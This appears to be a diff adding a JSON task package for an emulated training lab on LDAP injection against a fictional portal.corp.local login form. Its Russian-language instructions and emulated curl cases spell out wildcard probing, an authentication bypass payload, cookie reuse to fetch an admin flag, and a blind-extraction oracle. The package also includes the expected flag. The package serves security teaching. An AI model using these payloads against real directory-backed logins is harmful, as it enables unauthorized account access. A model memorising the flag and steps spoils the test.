@@ -1,0 +1,55 @@
+{
+  "id": "web-ldap-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{ld4p_f1lt3r_1nj3ct10n_byp4ss}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: LDAP-инъекция на portal.corp.local\n\nФорма входа проверяет каталог LDAP. Фильтр склеивается: `(&(uid=<user>)(userPassword=<pass>))`.\n\n1. Базовое: `curl -s -X POST http://portal.corp.local/login --data 'username=alice&password=wrong'`.\n2. Wildcard: `--data 'username=*&password=x'` → ошибка меняется на `invalid password` (юзер найден).\n3. Обход: `--data 'username=*)(uid=*))(|(uid=*&password=x' -c cookies.txt` → `{\"ok\":true,...}` + cookie.\n4. Флаг: `curl -s -b cookies.txt http://portal.corp.local/admin/flag`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\nОракул: `--data 'username=admin)(description=nto{*&password=x'` → `{\"ok\":true}`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция portal.corp.local)",
+      "cases": [
+        {
+          "match": "admin/flag",
+          "example": "-s -b cookies.txt http://portal.corp.local/admin/flag",
+          "output": "{\"flag\": \"nto{ld4p_f1lt3r_1nj3ct10n_byp4ss}\"}"
+        },
+        {
+          "match": "admin\\)\\(description=",
+          "example": "--data 'username=admin)(description=nto{*&password=x'",
+          "output": "{\"ok\":true}\n"
+        },
+        {
+          "match": "\\(\\|\\(uid=\\*",
+          "example": "--data 'username=*)(uid=*))(|(uid=*&password=x' -c cookies.txt",
+          "output": "{\"ok\":true,\"user\":\"admin\",\"role\":\"administrator\"}\n",
+          "writes": [
+            "-c"
+          ]
+        },
+        {
+          "match": "username=\\*",
+          "example": "--data 'username=*&password=x'",
+          "output": "{\"error\":\"invalid password\"}\n"
+        },
+        {
+          "match": "username=alice",
+          "example": "--data 'username=alice&password=wrong'",
+          "output": "{\"error\":\"invalid credentials\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только POST /login и GET /admin/flag на portal.corp.local.\n"
+    }
+  }
+}
